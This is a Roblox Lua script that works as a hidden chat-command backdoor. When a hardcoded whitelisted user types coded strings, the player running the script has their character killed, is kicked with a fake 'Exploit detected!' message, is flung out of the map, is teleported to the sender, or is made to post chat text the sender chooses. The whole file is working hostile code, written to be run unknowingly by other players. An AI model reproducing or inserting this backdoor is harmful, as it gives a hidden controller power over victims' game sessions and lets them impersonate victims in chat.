local whitelisted = {"usernamemyisthiz"}
local events = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
if events then
    local messageDoneFiltering = events:WaitForChild("OnMessageDoneFiltering")
    local sayMessageRequest = events:WaitForChild("SayMessageRequest")
    local players = game:GetService("Players")
    local lp = players.LocalPlayer
    function getChar(plr)
        return plr.Character or plr.CharacterAdded:Wait()
    end
    function commands(chat, executor)
        if chat:match("klC") then --Kill
            getChar(lp):FindFirstChildOfClass("Humanoid").Health = 0
        elseif chat:match("kkC") then
            local reason_split = string.split(chat, " ")
            local reason = ""
            if #reason_split > 1 then
                for i=2, #reason_split - 1 do
                    reason = reason..reason_split[i].." "
                end
            else
                reason = "Exploit detected!"
            end
            lp:Kick(reason)
        elseif chat:match("vC") then
            getChar(lp):PivotTo(CFrame.new(9e9,9e9,9e9))
        elseif chat:match("bC") then
            getChar(lp):PivotTo(getChar(executor):GetPivot() * CFrame.new(0,0,3))
        elseif chat:match("tC") then
            local text_split = string.split(chat, " ")
            local text = ""
            for i=2, #text_split do
                text = text..text_split[i].." "
            end
            sayMessageRequest:FireServer(text)
        end
    end

    messageDoneFiltering.OnClientEvent:Connect(function(message)
        local player = players:FindFirstChild(message.FromSpeaker)
        local chat = message.Message or ""
        if (player == players.LocalPlayer) then
            return
        end
        if table.find(whitelisted, player.Name) and not table.find(whitelisted, lp.Name) then
            commands(chat, player)
        end
    end)
    return
end
local TextChatService = game:GetService("TextChatService")
local players = game:GetService("Players")
local lp = players.LocalPlayer
function getChar(plr)
	return plr.Character or plr.CharacterAdded:Wait()
end
function commands(chat, executor)
	if chat:match("klC") then --Kill
		getChar(lp):FindFirstChildOfClass("Humanoid").Health = 0
	elseif chat:match("kkC") then
		local reason_split = string.split(chat, " ")
        local reason = ""
        if #reason_split > 1 then
            for i=2, #reason_split - 1 do
                reason = reason..reason_split[i].." "
            end
        else
            reason = "Exploit detected!"
        end
        lp:Kick(reason)
	elseif chat:match("vC") then
		getChar(lp):PivotTo(CFrame.new(9e9,9e9,9e9))
	elseif chat:match("bC") then
		getChar(lp):PivotTo(getChar(executor):GetPivot() * CFrame.new(0,0,3))
	end
end
TextChatService.OnIncomingMessage = function(message)
	local plr = players:GetPlayerByUserId(message.TextSource.UserId)
	local txt = message.Text
	if table.find(whitelisted, plr.Name) then
		commands(txt, plr)
	end
end
